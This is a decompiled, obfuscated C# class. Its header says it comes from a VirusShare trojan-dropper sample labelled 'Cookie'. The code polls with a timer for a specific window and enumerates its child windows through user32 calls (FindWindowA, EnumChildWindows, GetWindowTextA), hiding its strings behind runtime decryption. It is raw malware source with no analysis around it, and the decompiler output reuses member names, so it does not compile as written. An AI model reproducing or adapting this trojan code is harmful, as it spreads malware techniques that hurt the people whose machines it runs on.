// Decompiled with JetBrains decompiler
// Type: .
// Assembly: x1x1x1x1x1x1x1x1x, Version=2.1.1.2, Culture=neutral, PublicKeyToken=null
// MVID: 41668E8C-580E-4768-8756-53F1BC9ECCC7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan-Dropper.MSIL.Cookie.e-e73a14fc8e256d29203c913eab14be6d27a7cfbe002ae112a4b3e56f2707759e.exe

using \u0001;
using \u0005;
using Microsoft.VisualBasic;
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace \u0005
{
  internal sealed class \u0002
  {
    private static Timer \u0001 = new Timer();
    private static IntPtr \u0001;
    public static string \u0001;
    private static IntPtr \u0002 = IntPtr.Zero;
    private static string \u0002 = \u0004.\u0003(5600);
    private static string \u0003 = \u0004.\u0003(5721);
    private static string \u0004 = \u0004.\u0003(6003);
    private static string \u0005 = \u0004.\u0003(6185);
    private static string \u0006 = \u0004.\u0003(5600);
    private static string \u0007 = \u0004.\u0003(6615);

    [DllImport("user32.dll", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0003([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

    [DllImport("user32.dll", EntryPoint = "EnumChildWindows", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0003([In] IntPtr obj0, [In] \u0002.\u0001 obj1, [In] int obj2);

    [DllImport("user32", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0003([In] IntPtr obj0, [In] StringBuilder obj1, [In] int obj2);

    [DllImport("user32", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0004([In] IntPtr obj0, [In] StringBuilder obj1, [In] int obj2);

    [DllImport("user32", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0003([In] IntPtr obj0);

    private static void \u0003([In] object obj0, [In] EventArgs obj1)
    {
      if (\u0012\u0004.\u0012\u0004(\u0002.\u0002, IntPtr.Zero))
      {
        string str1 = (string) null;
        \u0016\u0005 obj = \u0016\u0005.\u0011\u0004;
        ref string local1 = ref str1;
        string str2 = \u0004.\u0003(29054);
        ref string local2 = ref str2;
        int num = \u0002.\u0003(ref local1, ref local2);
        \u0002.\u0001 = obj(num);
        if (!\u0012\u0004.\u0013\u0004(\u0002.\u0001, \u0016\u0005.\u0011\u0004(0)))
          return;
        \u0002.\u0003(\u0002.\u0001, new \u0002.\u0001(\u0002.\u0003), 0);
      }
      else
        \u0003.\u0003(\u0002.\u0001, \u0002.\u0002);
    }

    [SpecialName]
    public static void \u0003([In] bool obj0)
    {
      if (obj0)
      {
        \u0002.\u0001 = \u0019\u0005.\u007E\u0012\u0008((object) \u009B\u0004.\u0015\u0008());
        if (\u0099\u0004.\u007E\u001B\u0007((object) \u0002.\u0001) != 1)
        {
          Timer timer = \u0002.\u0001;
          \u008D\u0004.\u007E\u0018\u0007((object) \u0002.\u0001, new EventHandler(\u0002.\u0003));
          \u0014\u0003.\u007E\u001C\u0007((object) timer, 1);
          \u000F\u0005.\u007E\u001A\u0007((object) timer, true);
          \u001E\u0004.\u007E\u001D\u0007((object) timer);
        }
        else
        {
          \u000F\u0005.\u007E\u001A\u0007((object) \u0002.\u0001, true);
          \u001E\u0004.\u007E\u001D\u0007((object) \u0002.\u0001);
        }
      }
      else
      {
        \u000F\u0005.\u007E\u001A\u0007((object) \u0002.\u0001, false);
        \u001E\u0004.\u007E\u001E\u0007((object) \u0002.\u0001);
        \u0002.\u0002 = IntPtr.Zero;
      }
    }

    private static int \u0003([In] IntPtr obj0, [In] int obj1)
    {
      string str1 = \u0002.\u0003(obj0);
      string str2 = \u0002.\u0004(obj0);
      if (\u0011\u0003.\u001A\u0002(\u0019\u0005.\u007E\u0018\u0003((object) str1), \u0004.\u0003(29083), CompareMethod.Binary) != 0 && \u0011\u0003.\u001A\u0002(str2, \u0004.\u0003(29104), CompareMethod.Binary) != 0)
        \u0002.\u0002 = obj0;
      string[] strArray = new string[5]
      {
        obj0.ToString(),
        \u0004.\u0003(29117),
        str1,
        \u0004.\u0003(29117),
        str2
      };
      string str3 = \u0007\u0003.\u001E\u0003(strArray);
      return 1;
    }

    private static string \u0003([In] IntPtr obj0)
    {
      StringBuilder stringBuilder = new StringBuilder();
      \u0014\u0003.\u007E\u0084\u0003((object) stringBuilder, (int) byte.MaxValue);
      \u0002.\u0003(obj0, stringBuilder, \u0099\u0004.\u007E\u0083\u0003((object) stringBuilder));
      return \u0019\u0005.\u007E\u0082\u0003((object) stringBuilder);
    }

    private static string \u0004([In] IntPtr obj0)
    {
      StringBuilder stringBuilder = new StringBuilder();
      \u0014\u0003.\u007E\u0084\u0003((object) stringBuilder, checked (\u0002.\u0003(obj0) + 1));
      \u0002.\u0004(obj0, stringBuilder, \u0099\u0004.\u007E\u0083\u0003((object) stringBuilder));
      return \u0019\u0005.\u007E\u0082\u0003((object) stringBuilder);
    }

    private delegate int \u0001(IntPtr lngHwnd, int lngLParam);
  }
}
